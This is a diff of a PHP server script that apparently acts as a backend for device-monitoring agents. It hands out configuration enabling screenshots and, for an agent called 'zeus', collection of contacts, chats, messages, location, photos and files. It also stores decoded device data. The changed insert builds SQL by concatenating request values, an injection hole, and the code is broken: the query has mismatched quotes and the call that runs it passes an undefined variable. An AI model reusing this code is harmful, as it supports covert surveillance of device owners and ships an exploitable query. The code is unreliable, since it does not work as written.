@@ -25,16 +25,16 @@ if (!empty($task)) {
 	}
 
 	if ($task == 'getConfigurations') {
-	$social = [];
+		$social = [];
 	
-	if ($query_params['agent'] == 'zeus') {
-		$social = array("addressbook" => 1, "chat" => 1, "messages" => 1, "position" => 1, "photo" => 1, "file" => 1, "device" => 1);
-	}
+		if ($query_params['agent'] == 'zeus') {
+			$social = array("addressbook" => 1, "chat" => 1, "messages" => 1, "position" => 1, "photo" => 1, "file" => 1, "device" => 1);
+		}
 
-	$data = array('screenshoot' => 1, 'social' => $social, 'deviceInfo' => 1);
+		$data = array('screenshoot' => 1, 'social' => $social, 'deviceInfo' => 1);
 
-	header('Content-Type: application/json');
-	echo json_encode($data);
+		header('Content-Type: application/json');
+		echo json_encode($data);
 	}
 	else if ($task == 'setConfigurations') {
 		$newConfigurations = $query_params['data'];
@@ -57,20 +57,12 @@ if (!empty($task)) {
 		// Get base 64 encoded data & decode it
 		if (!empty($query_params['data'])) {
 			$deviceInfo = $query_params['data'];
-
 			$decodedData = base64_decode($deviceInfo);
+			$deviceInfo = json_decode($decodedData, true);
 
-			echo "$decodedData: " . $decodedData . "\n";
+			$query = "INSERT INTO DeviceInfo ('os', 'cpuArchitecture', 'installedApps', 'memory', 'time', 'date', 'deviceID') VALUES ('" . $deviceInfo["os"] . "', " . $deviceInfo["cpuArchitecture"] . ", '" . $deviceInfo["installedApps"] . "', '" . $deviceInfo["memory"] . "', '" . $deviceInfo["time"] . "', '" . $deviceInfo["date"] . "', '" . $deviceInfo["deviceID"] . "'')";
 
-			$array = explode(',', $decodedData);
-			$deviceInfo = array();
-			array_walk($array,'walk', $deviceInfo);
-
-			echo "$deviceInfo: " . $deviceInfo . "\n";
-
-			$query = "INSERT INTO DeviceInfo ('os', 'cpuArchitecture', 'installedApps', 'memory', 'time', 'date', 'deviceID') VALUES (" . $deviceInfo["os"] . ", " . $deviceInfo["cpuArchitecture"] . ", " . $deviceInfo["installedApps"] . ", " . $deviceInfo["memory"] . ", " + $deviceInfo["time"] . ", " . $deviceInfo["date"] . ", " . $deviceInfo["deviceID"] . ")";
-
-			echo "$query: " . $query . "\n";
+			echo "query: " . $query . "\n";
 
 			$queryResults = performSqlQuery($dbConnection, $sql);
 			echo "queryResults: " . $queryResults;
